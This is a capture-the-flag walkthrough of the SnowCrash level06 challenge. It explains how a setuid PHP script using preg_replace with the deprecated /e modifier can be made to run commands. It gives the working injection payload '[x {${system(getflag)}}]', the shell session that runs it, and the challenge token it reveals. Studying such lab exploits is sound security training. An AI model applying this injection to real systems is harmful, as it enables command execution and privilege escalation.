# level06

## Hint

As we log in the VM, we are greeted by two files, a binary and, believably, the PHP source for that binary.

```shell-session
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Since the binary has `suid` rights granted, it seems obvious that there is some priviledge rights escalation possible here. Lets look into the source file.

## the script

```php
#!/usr/bin/php
<?php
function y($m)
{
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}

function x($y, $z)
{
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

A quick lookup at the php documentation for `preg_replace()` tells us that there is a deprecated feature used in that code, that is the `/e` modifier for the regex.
> Deprecated: preg_replace(): The /e modifier is deprecated, use preg_replace_callback instead

One would wonder why this modifier is now deprecated, and one would easily find that it was the source for an RCE (Remote Code Execution) vulnerability.

Since this modifier made the match of that function call to be interpreted as PHP code, one could take advantage of a given script's rights to inject code and obtain unwarranted access, in time, to the entire filesystem.

## RCE

In order to actually inject code in that match, one must understand what pattern this regex match is aiming at.

Here's the signature of that function:

```php
<?php         //This is for syntax coloration
preg_replace(
    string|array $pattern,
    string|array $replacement,
    string|array $subject,
    int $limit = -1,
    int &$count = null
): string|array|null
?>
```

Here is the call with the deprecated feature:

```php
<?php //This is for syntax coloration
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
?>
```

So we're looking to write a string of this form:
> x[ something ]

Knowing that there is a way to call system-wide command from inside php code (namely the `system(<command>);` function, we just need to insert a call to that function in the regex match:

```shell-session
level06@SnowCrash:~$ echo '[x system(getflag)]' > /tmp/file.rce
level06@SnowCrash:~$ ./level06 /tmp/file.rce
No entry for terminal type "alacritty";
using dumb terminal settings.
system(getflag)
```

Unfortunately, this isn't enough, our call to the `system` function is not evaluated, and is considered a plain string. There is one last thing to try, though.

Php has a feature that lets PHP variables be evaluated in the middle of a string they are referenced in, it's called `complex syntax`.

```php
<?php
echo '{$var}'; // evaluates to the content of the variable called var
?>
```

```php
<?php
echo '{${var}}'; // evaluates to the content of the variable returned by the function (or method) called var
?>
```

To conclude, since `system` is a function, we can use the latter syntax to get what we want.

## getflag

```shell-session
level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/file.rce
level06@SnowCrash:~$ ./level06 /tmp/file.rce
No entry for terminal type "alacritty";
using dumb terminal settings.
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
